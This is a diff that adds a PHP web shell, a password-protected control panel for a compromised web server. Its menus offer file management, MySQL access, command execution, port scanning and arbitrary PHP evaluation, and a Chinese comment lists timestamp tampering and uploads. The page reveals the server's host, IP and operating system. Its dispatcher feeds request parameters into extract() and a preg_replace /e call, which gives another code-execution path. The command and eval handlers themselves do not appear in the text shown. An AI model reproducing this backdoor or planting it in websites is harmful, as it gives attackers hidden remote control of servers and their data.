@@ -1,0 +1,390 @@
+//<?php
+
+date_default_timezone_set('asia/shanghai');
+class project {
+  static function init() {
+    self::G('time');
+    self::headers();
+    self::G('time', 'end');
+  }
+  static protected function headers() {
+    $eof = <<< HTML
+<!DOCTYPE HTML>
+<head>
+	<meta http-equiv="content-type" content="text/html" />
+    <meta http-equiv="content-type" charset="UTF-8"/>
+	<meta name="author" content="Steve Smith" />
+	<title>{title}</title>
+    <style>
+a{color:#00f;text-decoration:underline;}a:hover{color:#f00;text-decoration:none;}body{font:12px Arial,Tahoma;line-height:16px;margin:0;padding:0;}#header{height:20px;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#header .left{float:left;}#header .right{float:right;}#menu{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}#content{margin:0 auto;width:98%;}#content h2{margin-top:15px;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}#content #base,#content #base2{background:#eee;margin-bottom:10px;}#base input{float:right;border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;margin:5px 10px;}.cdrom{padding:5px;margin:auto 7px;}.h{margin-top:8px;}#base2 .input{font:12px Arial,Tahoma;background:#fff;border:1px solid #666;padding:2px;height:18px;}#base2 .bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}#list .head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}#list .head td span{font-weight:normal;}.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}#footer{padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;}#load{position:fixed;right:0;border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;display:none;}
+    </style>
+</head>
+<body>
+<div id="load">
+loading……
+</div>
+<div id="header">
+  <div class="left">
+  {host}({ip})
+  </div>
+  <div class="right">
+  {uname} software:{software} 
+  </div>
+</div>
+<div id="menu">
+    {menu}
+</div>
+<div id="content">
+<h2>File Manager - Current disk free <span id="total"></span></h2>
+  <div id="base">
+    <input class="bt" id="jumpto" name="jumpto" value="Jump to" type="button" />
+    <div class="cdrom">
+      <span id="current"></span> - <span id="chmod"></span>/ <span id="perms"></span> 
+    </div>
+    <div class="cdrom">
+      {cdrom}
+    </div>
+  </div>
+  <div class="h"></div>
+  <div id="base2">
+    <div class="cdrom">
+      {action}
+    </div>
+    <div class="cdrom">
+      Find string in files(current folder): <input class="input" name="findstr" value="" type="text" /> <input class="bt" value="Find" type="submit" /> Type: <input class="input" name="writabledb" value="php,cgi,pl,asp,inc,js,html,htm,jsp" type="text" /><input name="dir" value="C:/freebsd/" type="hidden" /> 
+    </div>
+  </div>
+  <div id="list">
+  </div>
+</div>
+<div class="h"></div>
+<div id="footer">
+  <span style="float:right;">
+     Processed in <span id="runtime">{time}</span> second(s)
+  </span>
+  Powered by {copyright}
+  . Copyright (C) 2010-2012
+   All Rights Reserved.
+</div>
+
+<script type="text/javascript">
+  function $(id){
+    return document.getElementById(id);
+  }
+ function ajax(url,type){
+    $("load").style.display="block";
+    var xml;
+    try{
+    xml=new XMLHttpRequest();
+   }catch(e){
+    xml=new ActiveXObject("MIcrosoft.XMLHTTP");
+   }
+ xml.onreadystatechange=function(){
+    if (4==xml.readyState){
+        if(200==xml.status){
+            eval(xml.responseText);
+            $("list").innerHTML=json.file;
+            $("runtime").innerHTML=json.runtime;
+            $("total").innerHTML=json.disktotal;
+            $("current").innerHTML=json.current;
+            $("chmod").innerHTML=json.chmod;
+            $("perms").innerHTML=json.perms;
+            $("load").style.display="none";
+        }
+    }
+ }  
+    /***
+     1 遍历目录 2创建文件3 创建文件夹4删除/批量删除文件(夹)5文件下载6时间修改7文件上传...8端口扫描
+     *****/
+    url= url ? url : '?action=show';
+    if(1==type) url='?action=show|dir|'+url;
+    xml.open("get",url,true);
+    xml.send();
+ }
+ ajax();
+</script>
+</body>
+</html>
+HTML;
+    $actions = array(
+      'WebRoot' => self::switchUrl($_SERVER['DOCUMENT_ROOT']),
+      'Create Directory' => '',
+      'Create File' => '',
+      );
+    $menus = array(
+      'Logout',
+      'File Manager' => self::switchUrl($_SERVER['DOCUMENT_ROOT']),
+      'MYSQL Manager' => '',
+      'MySQL Upload' => '',
+      'Execute Command' => '',
+      'PHP Variable' => '',
+      'Port Scan' => '',
+      'Eval PHP Code' => '');
+    $menu = '';
+    $action = '';
+    $logout = array_shift($menus);
+    $menu .= sprintf('<a href="javascript:void()" onclick=location="%s" >%s</a> | ',
+      '?action=logout', $logout);
+    foreach ($menus as $key => $val) {
+      $menu .= sprintf('<a href="javascript:void()" name="%s" onclick=ajax(this.name,1)>%s</a> | ',
+        $val, $key, "\r\n");
+    }
+    foreach ($actions as $key => $val) {
+      $action .= sprintf('<a href="javascript:void()" name="%s" onclick=ajax(this.name,1)>%s</a> | ',
+        $val, $key, "\r\n");
+    }
+    $serach = array(
+      '{title}',
+      '{host}',
+      '{ip}',
+      '{uname}',
+      '{software}',
+      '{menu}',
+      '{copyright}',
+      '{time}',
+      '{cdrom}',
+      '{action}');
+    $replace = array(
+      title,
+      $_SERVER['HTTP_HOST'],
+      $_SERVER['SERVER_ADDR'],
+      php_uname('s'),
+      $_SERVER["SERVER_SOFTWARE"],
+      trim($menu, '| '),
+      copyright,
+      self::G('time', 'end'),
+      self::disk(),
+      trim($action, '| '));
+    $eof = str_replace($serach, $replace, $eof);
+    echo $eof;
+  }
+  static protected function switchUrl($url, $type = '') {
+    if (true === $type) {
+      $serach = '*';
+      $replace = '/';
+    }
+    else {
+      $serach = '/';
+      $replace = '*';
+    }
+    return str_replace($serach, $replace, $url);
+  }
+  static protected function explode_path($url) {
+    if (substr_count($url, '*') !== 1) {
+      $path = explode('*', $url);
+      array_pop($path);
+      foreach ($path as $i => $v) {
+        $u .= $v . "*";
+        $paths .= sprintf('<a href="javascript:void()" name="%s" onclick="%s">%s</a> ',
+          (true === is_win) ? trim(self::switchUrl(iconv('GBK', 'UTF-8', $u)),
+          "*") : "*" . trim(self::switchUrl(iconv('GBK', 'UTF-8', $u)), "*"),
+          'ajax(this.name,1)', iconv('GBK', 'UTF-8', $v));
+      }
+    }
+    return $paths;
+  }
+  static protected function disk() {
+    if (is_win) {
+      $cdrom = range('A', 'Z');
+      foreach ($cdrom as $disk) {
+        $disk = sprintf("%s%s", $disk, ':');
+        if (is_readable($disk)) {
+          $return .= sprintf('<a href="javascript:void()" name="%s" onclick="ajax(this.name,1)">disk %s</a> | ',
+            $disk, $disk);
+        }
+      }
+      return trim($return, "| ");
+    }
+    else {
+      $cdrom = scandir('/');
+      foreach ($cdrom as $disk) {
+        if ($disk == '.' || $disk == '..') continue;
+        $disk = sprintf("%s%s", '/', $disk);
+        if (is_readable($disk)) {
+          if (is_dir($disk)) $return .= sprintf('<a href="javascript:void()" name="%s" onclick="ajax(this.name,1)">%s</a> | ',
+              self::switchUrl($disk), str_replace('/', '', $disk));
+        }
+      }
+      return trim($return, "| ");
+    }
+  }
+  static function G($start, $end = '', $dec = 6) {
+    static $_info = array();
+    if (is_float($end)) { // 记录时间
+      $_info[$start] = $end;
+    }
+    elseif (!empty($end)) { // 统计时间
+      if (!isset($_info[$end])) $_info[$end] = microtime(true);
+      return number_format(($_info[$end] - $_info[$start]), $dec);
+    }
+    else { // 记录时间
+      $_info[$start] = microtime(true);
+    }
+  }
+  static protected function authentication() {
+    if (true == password) {
+      //if(!empty($_POST['pwd']) && !preg_match('/^[a-z0-9]+$/',$_POST['pwd'])) exit;
+      if (strlen(password) == 32) $password = hash(crypt, $_POST['pwd']);
+      else  $password = $_POST['pwd'];
+      if (isset($password) && $password == password) {
+        setcookie('verify', $password, time() + 3600);
+        self::reload();
+      }
+      if (!isset($_COOKIE['verify']) || empty($_COOKIE['verify']) || (string )$_COOKIE['verify']
+        !== password) {
+        self::login();
+        exit;
+      }
+    }
+  }
+  public function logout() {
+    setcookie('verify', '', time() - 3600);
+    self::reload();
+  }
+  static protected function reload() {
+    header("Location:" . self);
+  }
+  static protected function login() {
+    printf('
+         <!DOCTYPE HTML>
+         <head>
+	     <meta http-equiv="content-type" content="text/html" />
+   	     <meta name="author" content="Steve Smith" />
+         <meta http-equiv="content-type" charset="UTF-8" />
+	     <style type="text/css">
+	     input {font:11px Verdana;BACKGROUND: #FFFFFF;height: 18px;border: 1px solid #666666;}
+	    </style>
+   	    <title>%s</title>
+        </head>
+        <body>
+	   <form method="POST" action="%s">
+       <span style="font:11px Verdana;">Password: </span><input id="pwd" name="pwd" type="password" size="20">
+       <input id="login" type="submit" value="Login">
+        </form>
+       </body>
+       </html>
+
+    ', title, self);
+  }
+  static function despatcher() {
+    self::authentication();
+    global $path;
+    extract($_GET);
+    $url = isset($action) ? strtolower(trim($action, ext)) : 'init';
+    //分析多个参数
+    if (strpos($url, ext)) {
+      $paths = explode(ext, $url);
+      $path = array_shift($paths);
+      unset($url);
+    }
+    if (count($paths) > 1) {
+      @preg_replace('@(\w+)\/([^\/]+)@ies', '$var[\'\\1\']=\'\\2\'', join('/', $paths));
+      $get = isset($var) ? $var : array(); //避免参数错误
+      $_GET = array_merge($_GET, $get);
+    }
+    $path = isset($path) ? $path : $url;
+    //if(!method_exists(__class__,$path)) return false;
+    //call_user_func(array(__class__,$path));
+    return;
+  }
+  static protected function perms($file, $path = '', $type = '1') {
+    if ($type == 1) {
+      //foreach($file as $v){
+      $url = self::is_utf8($file) ? $path . iconv('UTF-8', 'GBK', $file) : $path .
+        $file;
+      return substr(sprintf('%o', fileperms($url)), -4);
+      //}
+      //return $perms;
+    }
+    if ($type == 2) {
+      //foreach($file as $v){
+      $url = self::is_utf8($file) ? $path . iconv('UTF-8', 'GBK', $file) : $path .
+        $file;
+      return self::getperms($url);
+      //}
+      //return $perms;
+    }
+    if ($type == 3) {
+      $url = self::is_utf8($file) ? $path . iconv('UTF-8', 'GBK', $file) : $path .
+        $file;
+      return date('Y-m-d h:i:s', filemtime($url));
+    }
+    if ($type == 4) {
+      $url = self::is_utf8($file) ? $path . iconv('UTF-8', 'GBK', $file) : $path .
+        $file;
+      return is_dir($url) ? 'directory' : self::byte_format(sprintf("%u",
+        filesize($url)));
+    }
+  }
+  static protected function getperms($path) {
+    $perms = fileperms($path);
+    if (($perms & 0xC000) == 0xC000) {
+      $info = 's';
+    }
+    elseif (($perms & 0xA000) == 0xA000) {
+      $info = 'l';
+    }
+    elseif (($perms & 0x8000) == 0x8000) {
+      $info = '-';
+    }
+    elseif (($perms & 0x6000) == 0x6000) {
+      $info = 'b';
+    }
+    elseif (($perms & 0x4000) == 0x4000) {
+      $info = 'd';
+    }
+    elseif (($perms & 0x2000) == 0x2000) {
+      $info = 'c';
+    }
+    elseif (($perms & 0x1000) == 0x1000) {
+      $info = 'p';
+    }
+    else {
+      $info = '?????????';
+      return $info;
+    }
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms &
+      0x0800) ? 'S' : '-'));
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms &
+      0x0400) ? 'S' : '-'));
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms &
+      0x0200) ? 'T' : '-'));
+    return $info;
+  }
+  static protected function is_utf8($string) {
+    return preg_match('%^(?:
+         [\x09\x0A\x0D\x20-\x7E]            # ASCII
+       | [\xC2-\xDF][\x80-\xBF]             # non-overlong 2-byte
+       |  \xE0[\xA0-\xBF][\x80-\xBF]        # excluding overlongs
+       | [\xE1-\xEC\xEE\xEF][\x80-\xBF]{2}  # straight 3-byte
+       |  \xED[\x80-\x9F][\x80-\xBF]        # excluding surrogates
+       |  \xF0[\x90-\xBF][\x80-\xBF]{2}     # planes 1-3
+       | [\xF1-\xF3][\x80-\xBF]{3}          # planes 4-15
+       |  \xF4[\x80-\x8F][\x80-\xBF]{2}     # plane 16
+    )*$%xs', $string);
+  }
+  static protected function byte_format($size, $dec = 2) {
+    $a = array(
+      "B",
+      "KB",
+      "MB",
+      "GB",
+      "TB",
+      "PB");
+    $pos = 0;
+    while ($size >= 1024) {
+      $size /= 1024;
+      $pos++;
+    }
+    return round($size, $dec) . "" . $a[$pos];
+  }
+}
+//
+
+?>
